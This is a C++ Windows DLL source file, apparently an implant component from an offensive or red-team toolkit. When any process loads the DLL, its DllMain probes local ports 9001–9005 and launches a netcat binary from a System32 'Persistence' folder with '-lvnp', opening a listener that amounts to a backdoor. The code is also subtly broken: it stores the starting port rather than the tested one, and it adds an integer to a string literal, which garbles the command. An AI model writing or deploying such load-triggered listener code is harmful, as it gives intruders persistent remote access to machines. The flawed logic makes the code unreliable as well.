// source: https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-listen

#include "listener.hpp"

std::string componentName = "listener";

BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,  // handle to DLL module
    DWORD fdwReason,     // reason for calling function
    LPVOID lpvReserved)  // reserved
{
    // Perform actions based on the reason for calling.
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        // Initialize once for each new process.
        // Return FALSE to fail DLL load.
        Init();
        break;

    case DLL_THREAD_ATTACH:
        // Do thread-specific initialization.
        break;

    case DLL_THREAD_DETACH:
        // Do thread-specific cleanup.
        break;

    case DLL_PROCESS_DETACH:

        if (lpvReserved != nullptr)
        {
            break; // do not do cleanup if process termination scenario
        }

        // Perform any necessary cleanup.
        break;
    }
    return TRUE;  // Successful DLL_PROCESS_ATTACH.
}

int Init() {
	Log("[+] Starting " + componentName + ".", componentName);
	Log("[*] Running as " + GetUserAndContext(), componentName);

    //BOOL socketSuccess = FALSE;
    int port = 9001;
    int goodport = 0;
    for (int i = port; i <= 9005; i++) {
        try {
            //----------------------
            // Initialize Winsock
            WSADATA wsaData;
            int iResult = 0;

            SOCKET ListenSocket = INVALID_SOCKET;
            sockaddr_in service;

            iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
            if (iResult != NO_ERROR) {
                Log("WSAStartup() failed with error: " + std::to_string(iResult), componentName);
                continue;
            }

            //----------------------
            // Create a SOCKET for listening for incoming connection requests.
            ListenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (ListenSocket == INVALID_SOCKET) {
                Log("socket function failed with error: " + std::to_string(WSAGetLastError()), componentName);
                WSACleanup();
                continue;
            }

            //----------------------
            // The sockaddr_in structure specifies the address family,
            // IP address, and port for the socket that is being bound.
            service.sin_family = AF_INET;
            service.sin_addr.s_addr = inet_addr("127.0.0.1");
            service.sin_port = htons(i);

            iResult = bind(ListenSocket, (SOCKADDR*)&service, sizeof(service));
            if (iResult == SOCKET_ERROR) {
                Log("[!] Bind function failed with error: " + std::to_string(WSAGetLastError()), componentName);
                iResult = closesocket(ListenSocket);
                if (iResult == SOCKET_ERROR)
                    Log("[!] Closesocket function failed with error: " + std::to_string(WSAGetLastError()), componentName);
                WSACleanup();
                continue;
            }

            goodport = port;
            WSACleanup();
            break;
        }
        catch (...) {
            Log("[!] Caught exception binding to port " + std::to_string(i), componentName);
            continue;
        }
    }

    CreateProc("listener", "C:\\Windows\\System32\\Persistence\\nc64.exe -lvnp " + goodport);

    //for (int i = port; i <= 9011; i++) {
    //    try {
    //        //----------------------
    //        // Initialize Winsock
    //        WSADATA wsaData;
    //        int iResult = 0;

    //        SOCKET ListenSocket = INVALID_SOCKET;
    //        sockaddr_in service;

    //        iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    //        if (iResult != NO_ERROR) {
    //            Log("WSAStartup() failed with error: " + std::to_string(iResult), componentName);
    //            continue;
    //        }

    //        //----------------------
    //        // Create a SOCKET for listening for incoming connection requests.
    //        ListenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    //        if (ListenSocket == INVALID_SOCKET) {
    //            Log("socket function failed with error: " + std::to_string(WSAGetLastError()), componentName);
    //            WSACleanup();
    //            continue;
    //        }

    //        //----------------------
    //        // The sockaddr_in structure specifies the address family,
    //        // IP address, and port for the socket that is being bound.
    //        service.sin_family = AF_INET;
    //        service.sin_addr.s_addr = inet_addr("127.0.0.1");
    //        service.sin_port = htons(i);

    //        iResult = bind(ListenSocket, (SOCKADDR*)&service, sizeof(service));
    //        if (iResult == SOCKET_ERROR) {
    //            Log("[!] Bind function failed with error: " + std::to_string(WSAGetLastError()), componentName);
    //            iResult = closesocket(ListenSocket);
    //            if (iResult == SOCKET_ERROR)
    //                Log("[!] Closesocket function failed with error: " + std::to_string(WSAGetLastError()), componentName);
    //            WSACleanup();
    //            continue;
    //        }

    //        //----------------------
    //        // Listen for incoming connection requests 
    //        // on the created socket
    //        if (listen(ListenSocket, SOMAXCONN) == SOCKET_ERROR)
    //            Log("[!] Listen function failed with error: " + std::to_string(WSAGetLastError()), componentName);

    //        Log("[*] Listening on socket port " + std::to_string(i), componentName);

    //        //iResult = closesocket(ListenSocket);
    //        //if (iResult == SOCKET_ERROR) {
    //        //    Log("[!] Closesocket function failed with error: " + std::to_string(WSAGetLastError()), componentName);
    //        //    WSACleanup();
    //        //    continue;
    //        //}

    //        //WSACleanup();
    //        socketSuccess = TRUE;
    //        break;
    //    }
    //    catch (...) {
    //        Log("[!] Caught exception binding to port " + std::to_string(i), componentName);
    //    }
    //}

    //socketSuccess ? Log("[+] Successfully created socket", componentName) : Log("[!] Failed to create socket", componentName);

	return 0;
}